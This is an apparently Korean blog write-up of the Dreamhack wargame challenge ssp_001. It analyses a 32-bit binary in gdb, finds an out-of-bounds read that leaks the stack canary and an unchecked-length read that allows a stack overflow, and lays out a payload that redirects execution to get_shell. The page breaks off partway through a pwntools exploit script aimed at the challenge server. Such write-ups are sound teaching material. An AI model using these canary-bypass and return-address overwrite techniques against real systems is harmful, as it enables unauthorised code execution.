<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> System Hacking Step 6: ssp_001 - TouBVa </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Stack Canary and How to Bypass It; wargame- System Hacking Step 6: ssp_001"> <meta name="keywords" content="System Hacking Step 6: ssp_001, TouBVa, dreamhack_system_hacking,System Hacking, Stack Canary"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="TouBVa" property="og:site_name" /> <meta content="System Hacking Step 6: ssp_001" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Stack Canary and How to Bypass It; wargame" property="og:description" /> <meta content="http://localhost:4000/blog/dreamhack_system_hacking/step6/ssp_001" property="og:url" /> <meta content="2023-02-03T22:44:23+09:00" property="article:published_time" /> <meta content="http://localhost:4000/about/" property="article:author" /> <meta content="http://localhost:4000/assets/img/posts/ssp_001/Untitled%207.jpeg" property="og:image" /> <meta content="dreamhack_system_hacking" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="System Hacking Step 6: ssp_001" /> <meta name="twitter:url" content="http://localhost:4000/blog/dreamhack_system_hacking/step6/ssp_001" /> <meta name="twitter:description" content="Stack Canary and How to Bypass It; wargame" /> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css" /> <!-- <link rel="stylesheet" href="http://localhost:4000/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="http://localhost:4000/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = 'http://localhost:4000' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="http://localhost:4000/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="http://localhost:4000/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="http://localhost:4000/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="http://localhost:4000/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="http://localhost:4000/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="http://localhost:4000/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="http://localhost:4000/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="http://localhost:4000/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="http://localhost:4000/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="http://localhost:4000/assets/js/search.js"></script> <script src="http://localhost:4000/assets/js/on-scroll-progress.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark nav-down" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">TouBVa</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/about" >About</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/contact" >Contact</a > </li> </ul> </div> <ul class="nav justify-content-end"> <!-- <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/styleguide"> Styleguide </a> </li>--> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <!-- <li class="nav-item" style="margin-top:5px; padding-right:20px;" > <a class="header__checkout snipcart-checkout"> <svg width="31" height="27" viewBox="0 0 31 27" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1.10512 0.368718C0.560256 0.368718 0.118164 0.812066 0.118164 1.35848C0.118164 1.9049 0.560256 2.34824 1.10512 2.34824H4.90887L8.30138 18.4009C8.43503 19.0053 8.83085 19.5079 9.32946 19.5041H25.7788C26.3005 19.5118 26.7799 19.0375 26.7799 18.5143C26.7799 17.9911 26.3006 17.5168 25.7788 17.5245H10.1315L9.71003 15.545H27.095C27.5371 15.5412 27.9547 15.2048 28.0511 14.7718L30.354 4.87412C30.4825 4.29933 29.9852 3.67172 29.3979 3.66786H7.21171L6.6771 1.15221C6.58329 0.71276 6.15921 0.368652 5.7107 0.368652L1.10512 0.368718ZM7.623 5.64746H12.7634L13.2569 8.61674H8.25005L7.623 5.64746ZM14.7785 5.64746H20.9881L20.4946 8.61674H15.2719L14.7785 5.64746ZM23.0031 5.64746H28.1537L27.4649 8.61674H22.5097L23.0031 5.64746ZM8.67181 10.5963H13.5862L14.0797 13.5656H9.29919L8.67181 10.5963ZM15.6009 10.5963H20.1656L19.6721 13.5656H16.0944L15.6009 10.5963ZM22.1807 10.5963H27.0023L26.3135 13.5656H21.6872L22.1807 10.5963ZM12.6197 20.164C10.8141 20.164 9.32979 21.6525 9.32979 23.4632C9.32979 25.2739 10.8141 26.7624 12.6197 26.7624C14.4252 26.7624 15.9095 25.2739 15.9095 23.4632C15.9095 21.6525 14.4252 20.164 12.6197 20.164ZM22.4892 20.164C20.6837 20.164 19.1994 21.6525 19.1994 23.4632C19.1994 25.2739 20.6837 26.7624 22.4892 26.7624C24.2948 26.7624 25.7791 25.2739 25.7791 23.4632C25.7791 21.6525 24.2948 20.164 22.4892 20.164ZM12.6197 22.1435C13.3586 22.1435 13.9356 22.7222 13.9356 23.4632C13.9356 24.2042 13.3586 24.7829 12.6197 24.7829C11.8807 24.7829 11.3037 24.2042 11.3037 23.4632C11.3037 22.7222 11.8807 22.1435 12.6197 22.1435ZM22.4892 22.1435C23.2282 22.1435 23.8052 22.7222 23.8052 23.4632C23.8052 24.2042 23.2282 24.7829 22.4892 24.7829C21.7503 24.7829 21.1733 24.2042 21.1733 23.4632C21.1733 22.7222 21.7503 22.1435 22.4892 22.1435Z" fill="#ff7901" class="header__checkout-fill"></path> </svg> <span class="snipcart-items-count"></span> </a> </li> --> </ul> </nav> <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> <script type="text/javascript"> var didScroll; var lastScrollTop = 0; var delta = 5; var navbarHeight = document.querySelector('#topNav').offsetHeight; window.addEventListener('scroll', function(event) { didScroll = true; }); setInterval(function() { if (didScroll) { hasScrolled(); didScroll = false; } }, 250); function hasScrolled() { var st = window.pageYOffset || document.documentElement.scrollTop; if (Math.abs(lastScrollTop - st) <= delta) return; var nav = document.querySelector('#topNav'); var prog = document.querySelector('#progress-bar'); if (st > lastScrollTop && st > navbarHeight) { nav.classList.remove('nav-down'); nav.classList.add('nav-up'); prog.classList.remove('toDown'); prog.classList.add('toUp'); } else { if (st < lastScrollTop) { nav.classList.remove('nav-up'); nav.classList.add('nav-down'); prog.classList.remove('toUp'); prog.classList.add('toDown'); } } lastScrollTop = st; } </script> <div id="progress-bar"></div> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="main-container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">System Hacking Step 6: ssp_001</h1> <h4 class="post-meta">Stack Canary and How to Bypass It; wargame</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="http://localhost:4000/blog/authors/TouBVa">TouBVa</a></span> </span > at <time datetime="2023-02-03 22:44:23 +0900" itemprop="datePublished" >Feb 3, 2023</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/dreamhack_system_hacking/step6/ssp_001" ></span> <div class="post-categories"> Category : <a href="/blog/categories/dreamhack_system_hacking" >dreamhack_system_hacking</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top" src="http://localhost:4000/assets/img/posts/ssp_001/Untitled%207.jpeg" alt="" /> <br /> <br /> <ul id="markdown-toc"> <li><a href="#1-코드-분석" id="markdown-toc-1-코드-분석">1. 코드 분석</a> <ul> <li><a href="#11-사용된-함수-목록-확인" id="markdown-toc-11-사용된-함수-목록-확인">1.1. 사용된 함수 목록 확인</a></li> <li><a href="#12-main-함수의-어셈블리-확인" id="markdown-toc-12-main-함수의-어셈블리-확인">1.2. main 함수의 어셈블리 확인</a> <ul> <li><a href="#121-함수-branch-별-행동-확인" id="markdown-toc-121-함수-branch-별-행동-확인">1.2.1. 함수 branch 별 행동 확인</a></li> <li><a href="#122-선택지-f의-경우" id="markdown-toc-122-선택지-f의-경우">1.2.2. 선택지 [F]의 경우</a></li> <li><a href="#123-선택지-p의-경우" id="markdown-toc-123-선택지-p의-경우">1.2.3. 선택지 [P]의 경우</a></li> <li><a href="#124-선택지-e의-경우" id="markdown-toc-124-선택지-e의-경우">1.2.4. 선택지 [E]의 경우</a></li> </ul> </li> </ul> </li> <li><a href="#2-취약점-지정-및-익스플로잇-방법-선정" id="markdown-toc-2-취약점-지정-및-익스플로잇-방법-선정">2. 취약점 지정 및 익스플로잇 방법 선정</a> <ul> <li><a href="#21-분석-요약-및-필요한-정보-선정" id="markdown-toc-21-분석-요약-및-필요한-정보-선정">2.1. 분석 요약 및 필요한 정보 선정</a></li> <li><a href="#22-필요한-정보-알아내기" id="markdown-toc-22-필요한-정보-알아내기">2.2. 필요한 정보 알아내기</a> <ul> <li><a href="#221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까" id="markdown-toc-221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까">2.2.1. [P] 옵션상에서, 사용자 입력값으로 무엇을 줘야 Canary Leak이 가능할까?</a></li> <li><a href="#222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까" id="markdown-toc-222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까">2.2.2. [E] 옵션 실행 시 삽입될 페이로드 구성은 어떻게 해야 할까?</a></li> <li><a href="#223-리턴-어드레스는-어디로-조작해야-할까" id="markdown-toc-223-리턴-어드레스는-어디로-조작해야-할까">2.2.3. 리턴 어드레스는 어디로 조작해야 할까?</a></li> </ul> </li> <li><a href="#23-취약점-익스플로잇-시나리오-세우기" id="markdown-toc-23-취약점-익스플로잇-시나리오-세우기">2.3. 취약점 익스플로잇 시나리오 세우기</a></li> </ul> </li> <li><a href="#3-익스플로잇-작성-후-실행" id="markdown-toc-3-익스플로잇-작성-후-실행">3. 익스플로잇 작성 후 실행</a></li> </ul> <p><br /></p> <h1 id="1-코드-분석">1. 코드 분석</h1> <p>이 문제는 코드와 바이너리를 함께 제시해 주는 문제다. 그러나 더 깊은 공부를 위해 코드가 주어지지 않았다는 가정 하에서 문제를 풀기 위해 바이너리를 분석해 보았다. 설명하기에 앞서, 바이너리만 주어진 상황에서의 분석 순서는 동적 분석 → 정적 분석이라는 점을 강조하고 싶다. 해당 바이너리가 어떤 행위를 하는지 추상적으로 알고 있어야 정적 분석을 할 때 중요한 포인트를 찾아가는 지표를 가질 수 있기 때문이다. 따라서, 아래에 이어지는 바이너리 정적 분석은 동적 분석이 이미 이루어졌다는 것을 전제로 한다.</p> <p><br /></p> <h2 id="11-사용된-함수-목록-확인">1.1. 사용된 함수 목록 확인</h2> <p>먼저 <code class="language-plaintext highlighter-rouge">ssp_001</code> 바이너리에 gdb를 물려 해당 바이너리 내부에서 사용되었던 functions들의 목록을 찾아 보았다. 바이너리가 ripped 되지 않았고, 난독화되지 않은 상태라면 쉽게 functions들의 목록을 불러올 수 있을 것이다.</p> <p><img src="/assets/img/posts/ssp_001/Untitled.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>당장 확인되는 functions들 중 눈에 띄는 건 <code class="language-plaintext highlighter-rouge">system@plt</code> 와 <code class="language-plaintext highlighter-rouge">get_shell</code> 이다. 전자가 존재한다는 것은 타겟 시스템에 ASLR이 걸려 있더라도 got, plt overwrite 방식으로 우회하여 쉘을 딸 수 있다는 의미이고, 후자는 누가 봐도 함수의 코드 플로우를 조작해 접근해야 하는 목표물처럼 보이기 때문이다.</p> <p><br /></p> <h2 id="12-main-함수의-어셈블리-확인">1.2. main 함수의 어셈블리 확인</h2> <p>이제 <code class="language-plaintext highlighter-rouge">main</code> 함수의 어셈블리를 확인해 보자.</p> <p>카나리를 다루는 모습이다. 32비트 프로그램이므로 <code class="language-plaintext highlighter-rouge">ebp-0x8</code> 에 <code class="language-plaintext highlighter-rouge">gs:0x14</code> 가 들어간다. 관련한 내용은 <a href="https://toubva.github.io/blog/dreamhack_system_hacking/step6-1#/">여기</a>에서 복습하자!</p> <p><img src="/assets/img/posts/ssp_001/Untitled%201.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p><br /></p> <h3 id="121-함수-branch-별-행동-확인">1.2.1. 함수 branch 별 행동 확인</h3> <p>해당 바이너리의 실행 모습(선택지가 나오고, 사용자가 선택한 선택지에 따라 다른 내용의 프로그램 branch가 전개되는 형식)을 감안했을 때, 아마 main 함수 혹은 선택지를 제시하기 위해 call 되는 함수 내부에는 최소 3개 이상의 cmp-jmp 구문이 존재할 것이다. 해당 구간을 찾아 보았다.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%202.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>추측이 맞았다. 3개의 cmp-jmp 쌍이 존재했고, 각각의 쌍은 main 함수의 특정 부분으로 점프하는 모습을 보여준다. main 함수 내부에서 모든 작업이 이루어지는 것으로 생각되며, 해당 구문은 if - if - if - else 형식의 문법을 취하고 있는 것으로 보인다. 또한 cmp하는 대상이 각각 아스키 코드로 ‘F’, ‘P’, ‘E’인 것으로 봤을 때, 프로그램을 실행했을 때 바로 나오는 아래의 선택지 부분임을 알 수 있다.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%203.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>이제 각 선택지에 따른 동작을 확인해 보자.</p> <p><br /></p> <h3 id="122-선택지-f의-경우">1.2.2. 선택지 [F]의 경우</h3> <p>선택지 P의 경우인 어셈블리 라인은 <code class="language-plaintext highlighter-rouge">main+192</code> 부터 시작하므로 <code class="language-plaintext highlighter-rouge">main+155~main+187</code> 까지의 라인이 선택지 F에 해당된다.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%204.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>해당 라인의 핵심은 <code class="language-plaintext highlighter-rouge">read</code> 함수와 연관이 깊어 보인다. <code class="language-plaintext highlighter-rouge">read(0, eax([ebp-0x88]), 0x40)</code> 을 호출하는 정황으로 미루어 보았을 때, 사용자의 input 0x40개를 <code class="language-plaintext highlighter-rouge">ebp-0x88</code> 에 저장하는 것으로 보인다. 아마 실제 소스에서는 <code class="language-plaintext highlighter-rouge">read(0, buf, 0x40)</code>쯤 될 것이다.</p> <p><br /></p> <h3 id="123-선택지-p의-경우">1.2.3. 선택지 [P]의 경우</h3> <p><img src="/assets/img/posts/ssp_001/Untitled%205.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>선택지 P를 처리하는 어셈블리 라인에서는 주목할 만한 행위 두 가지가 보인다. 바로 <code class="language-plaintext highlighter-rouge">scanf("{some words}{format_string}", *(ebp-0x94))</code> 와 <code class="language-plaintext highlighter-rouge">print_box</code> 를 콜하는 것이다. 먼저 <code class="language-plaintext highlighter-rouge">ebp-0x94</code> 에 저장되는 것은 어셈블리어만을 보고 알 수는 없다. 32비트 환경에서의 주소값과 int 값은 동일한 4byte로 어셈블리어 상에서 구분이 안 되기 때문이다. 따라서 동적으로 분석해야만 한다. 그 결과, <code class="language-plaintext highlighter-rouge">ebp-0x94</code> 에는 int가 저장되는 것을 확인할 수 있었다.</p> <p><br /></p> <p>그렇다면 이제 <code class="language-plaintext highlighter-rouge">print_box(ebp-0x88, ebp-0x94)</code> 가 어떤 일을 하는지 알아보자.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%206.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p><code class="language-plaintext highlighter-rouge">ebp-0xc</code> 는 인자로 줬던 <code class="language-plaintext highlighter-rouge">ebp-0x94</code> 가 저장된 곳이고, <code class="language-plaintext highlighter-rouge">ebp-0x8</code>은 인자로 줬던 <code class="language-plaintext highlighter-rouge">ebp-0x88</code>이 저장된 곳이다.</p> <p><code class="language-plaintext highlighter-rouge">ebp-x088</code>을 a, <code class="language-plaintext highlighter-rouge">ebp-0x94</code>를 b라고 하면 a+b를 한 단위가 1바이트인 주소로 참조해 해당 주소에 저장된 하위 1바이트를 eax에 저장하여 printf에게 주는 인자로 사용한다. 이건 거꾸로 KTX를 타고 가면서 봐도 사용자에게 입력받았던 값을 index로 하여 char 배열을 참조한 다음, 해당 위치에 저장된 값을 출력해 주는 것처럼 보인다.</p> <p>이 지점에서 OOB(Out-Of-Bound)가 가능한 것으로 추측된다.</p> <p><br /></p> <h3 id="124-선택지-e의-경우">1.2.4. 선택지 [E]의 경우</h3> <p><img src="/assets/img/posts/ssp_001/Untitled%207.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p><code class="language-plaintext highlighter-rouge">scanf</code>와 <code class="language-plaintext highlighter-rouge">read</code>함수를 사용하는 것이 눈에 띈다. 아까부터 각 branch별로 특정 함수들을 강조하는데, 그 이유는 이들이 사용자와 interaction하는, 취약성을 내재할 확률이 가장 큰 부분이기 때문이다.</p> <p><code class="language-plaintext highlighter-rouge">scanf(”{string}{format_string}”, *(ebp-0x90))</code> , <code class="language-plaintext highlighter-rouge">read(0, *(ebp-0x48), *(ebp-0x90)</code> 을 보면 사용자로부터 입력받아 저장되는 <code class="language-plaintext highlighter-rouge">ebp-0x90</code> 이 int라는 것을 알 수 있다.</p> <p>즉, 사용자에게 특정 숫자를 받고, 그 숫자만큼의 글자를 입력받는 행위를 하고 있다. 이는 매우 취약한 코드인데, 검증되지 않은 입력을 검증하기 위한 boundary check 마저 검증되지 않은 소스에게 의존하고 있기 때문이다.</p> <p>해당 행위를 수행한 다음, 사진에는 잘려 있지만 스택 카나리를 확인하여 main 함수를 끝내는 플로우로 이어진다.</p> <p><br /></p> <p><br /></p> <h1 id="2-취약점-지정-및-익스플로잇-방법-선정">2. 취약점 지정 및 익스플로잇 방법 선정</h1> <p><br /></p> <h2 id="21-분석-요약-및-필요한-정보-선정">2.1. 분석 요약 및 필요한 정보 선정</h2> <p><br /></p> <p>앞에서 분석한 내용을 요약하면 아래와 같다.</p> <ul> <li>F 옵션: 사용자의 입력을 buf에 저장한다.</li> <li> <p>P 옵션: 사용자의 int type 입력 x 를 받아 buf[x]를 참조해 출력한다. 여기에서 OOB로 인한 Memory Leak이 가능하다. (아래 사진 참고-buf는 0x40 길이이므로 인덱스의 한계는 63이지만 70번 인덱스에 접근 가능하다)</p> <p><img src="/assets/img/posts/ssp_001/Untitled%208.jpeg" alt="Untitled" width="100%" height="100%" /></p> </li> <li>E 옵션: 사용자로부터 입력값의 길이 y를 받고, read 함수로 y 만큼의 입력을 받아 buf2에 저장한다. 해당 작업이 끝나면 프로그램을 종료한다. 여기에서 잘못된 boundary check로 인한 BOF 취약점이 발생한다.</li> </ul> <p><br /></p> <p>해당 프로그램을 익스플로잇하기 위해서 필요한 정보는 아래와 같다.</p> <ol> <li> <p>해당 프로그램에 걸려 있는 보호 기법의 목록</p> <p><img src="/assets/img/posts/ssp_001/Untitled%209.jpeg" alt="Untitled" width="100%" height="100%" /></p> <ul> <li>ASLR은 꺼져 있을 것이다.(현재 커리큘럼상)</li> <li>NX enabled 이므로 스택에는 실행 권한이 없다. 즉, RTL이나 PLT&amp;GOT overwrite 등으로 우회해야만 한다.</li> <li>RELRO가 Partial로 걸려 있다. 이 경우 GOT에는 RO가 걸리지 않으므로 GOT 변조로 우회 가능하다.</li> <li>스택 카나리가 걸려 있다. FSB 혹은 OOB 등으로 Canary Leak을 하는 것이 현실적인 우회 기법이다.</li> </ul> </li> <li>스택 카나리의 값 <ul> <li>P 옵션 실행 시 OOB로 인한 Canary Leak이 가능해 보인다.</li> <li><strong>그렇다면 사용자 입력값으로 얼마를 줘야 할까?</strong></li> </ul> </li> <li>스택 프레임을 오염시키고 무한 루프를 종료할 수 있는 코드 플로우 <ul> <li>E 옵션 실행 시 두 가지가 BOF로 인해 모두 가능하다.</li> <li><strong>ASLR이 꺼져 있고, NX enabled인 상황에서 가장 쉽게 가능한 방식인 RTL을 수행하기 위해 작성해야 하는 페이로드 구성은 무엇이 될까?</strong></li> </ul> </li> </ol> <p><br /></p> <h2 id="22-필요한-정보-알아내기">2.2. 필요한 정보 알아내기</h2> <p><br /></p> <h3 id="221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까">2.2.1. [P] 옵션상에서, 사용자 입력값으로 무엇을 줘야 Canary Leak이 가능할까?</h3> <p><br /></p> <p>P 옵션을 줬을 때 읽어오는 항목인 box 배열의 시작 지점이 스택의 어디에 할당되었는지 확인해 보자.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%2010.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>ebp-0x88 지점이다.</p> <p>그렇다면 스택 카나리는 어디에 저장되는지 확인해 보자.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%2011.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>ebp-0x8 지점이다.</p> <p>즉, box[0x80] 지점이 스택 카나리의 시작점일 것으로 추정된다. 정말인지 확인해 보자.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%2012.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>메모리를 낮은 주소에서부터 읽어오는 점, 그리고 현재 프로세서가 리틀 엔디안이라는 점을 감안하면 아마 스택 카나리의 값은 0x1e831700일 것이다.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%2013.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>실제로 확인해 보니 일치하는 것을 알 수 있었다.</p> <p><br /></p> <h3 id="222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까">2.2.2. [E] 옵션 실행 시 삽입될 페이로드 구성은 어떻게 해야 할까?</h3> <p><br /></p> <p>E 옵션을 줬을 때, 사용자가 입력할 길이를 지정하게 한 다음 입력을 받는다. 그렇다면 사용자의 입력을 받아 저장하는 버퍼의 위치는 어디일까?</p> <p><img src="/assets/img/posts/ssp_001/Untitled%2014.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>read 함수의 두번째 인자로 저장될 버퍼의 주소가 들어가므로 현재 <code class="language-plaintext highlighter-rouge">main+302</code> 에서 <code class="language-plaintext highlighter-rouge">eax</code> 에 들어간 <code class="language-plaintext highlighter-rouge">ebp-0x48</code> 이 인자가 저장될 주소이다.</p> <p>즉,</p> <p><strong>0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + return address + 0x04 dump + parameters</strong></p> <p>가 삽입할 페이로드의 구성이 된다.</p> <p><br /></p> <h3 id="223-리턴-어드레스는-어디로-조작해야-할까">2.2.3. 리턴 어드레스는 어디로 조작해야 할까?</h3> <p><br /></p> <p>1.1.에서 확인한 함수들의 이름 중 수상한 것이 두 개 있었다. 바로 <code class="language-plaintext highlighter-rouge">system</code> 과 <code class="language-plaintext highlighter-rouge">get_shell</code> 이었다. 전자를 사용할 수도 있지만 후자를 한 번 확인해 보고, 둘 중 무엇으로 코드 플로우를 변경하는 것이 효율적일지 고민해 보자.</p> <p><img src="/assets/img/posts/ssp_001/Untitled%2015.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p><img src="/assets/img/posts/ssp_001/Untitled%2016.jpeg" alt="Untitled" width="100%" height="100%" /></p> <p>진짜로 KTX 타고 백덤블링하면서 봐도 system(”/bin/sh”)를 실행해 주는 함수다.</p> <p>현재 ASLR이 꺼져 있어, 사용된 라이브러리의 베이스 주소를 찾고 → system 함수의 오프셋을 찾고 → /bin/sh 문자열의 주소를 찾은 다음 RTL을 하는 것보다 그냥 <code class="language-plaintext highlighter-rouge">get_shell</code> 함수로 리다이렉션을 하는 게 훨씬 나아 보인다. 따라서 리턴 어드레스로는 <code class="language-plaintext highlighter-rouge">get_shell</code> 의 주소를 줄 것이다.</p> <p>만일 ASLR이 켜져 있다면, OOB 취약점을 이용해 main의 리턴 어드레스까지를 읽어서(동일 버전으로 컴파일되었다면 main의 리턴 어드레스는 동일한 라이브러리 함수로 이어지기 때문에 libc base를 알아낼 수 있다) libc base를 알아내 RTL을 수행하는 게 더 쉬울지도 모른다.</p> <p><br /></p> <h2 id="23-취약점-익스플로잇-시나리오-세우기">2.3. 취약점 익스플로잇 시나리오 세우기</h2> <p><br /></p> <p>따라서 가능한 취약점 익스플로잇 시나리오는 크게 두 단계로 나뉘며, 아래와 같다.</p> <ol> <li>스택 카나리를 알아내는 과정 <ul> <li>P, 131, P, 130, P, 129, P, 128을 입력하고 값을 받기를 반복한다.</li> <li>받아온 값을 bytearray의 concatenate를 이용하여 조합해 p32() 함수로 패킹한다.</li> </ul> </li> <li>알아낸 카나리를 포함한 페이로드를 만들어 RTL이나 ROP를 성공시키는 과정 <ul> <li>페이로드의 구성: <ul> <li><strong>0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + get_shell addr + 0x04 dump + parameters</strong></li> </ul> </li> </ul> </li> </ol> <p><br /></p> <p><br /></p> <h1 id="3-익스플로잇-작성-후-실행">3. 익스플로잇 작성 후 실행</h1> <p><br /></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./ssp_001"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host3.dreamhack.games'</span><span class="p">,</span> <span class="mi">24236</span><span class="p">)</span>

<span class="n">get_shell</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_shell'</span><span class="p">]</span> <span class="c1">#get_shell 주소는 pwntools가 알아서 찾아줄 것이다
</span>
<span class="c1"># figuring out the stack canary
</span><span class="n">canary</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
<span class="n">temp</span><span class="o">=</span><span class="nb">bytearray</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"P"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">131</span><span class="o">-</span><span class="n">i</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"is : "</span><span class="p">)</span>
